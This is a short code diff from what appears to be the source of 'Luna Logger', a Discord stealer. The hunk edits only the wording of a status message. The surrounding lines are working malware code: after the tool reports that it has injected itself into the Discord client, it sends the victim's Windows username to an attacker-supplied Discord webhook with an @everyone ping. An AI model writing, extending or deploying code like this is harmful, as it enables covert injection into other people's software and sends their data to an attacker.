@@ -459,7 +459,7 @@ def inject(webhook_url):
 
 				embed.set_footer(text="Luna Logger | Created by Smug")
 				embed.set_thumbnail(url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096")
-				embed.add_field(name="Injection", value=f"Successfully injected into Discord\n\nUser: {os.getenv('UserName')}", inline=False)
+				embed.add_field(name="Injection", value=f"Successfully injected into Discord\nUser: {os.getenv('UserName')}", inline=False)
 	
 				webhook.send(content="@everyone", embed=embed, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096", username="Luna")
 
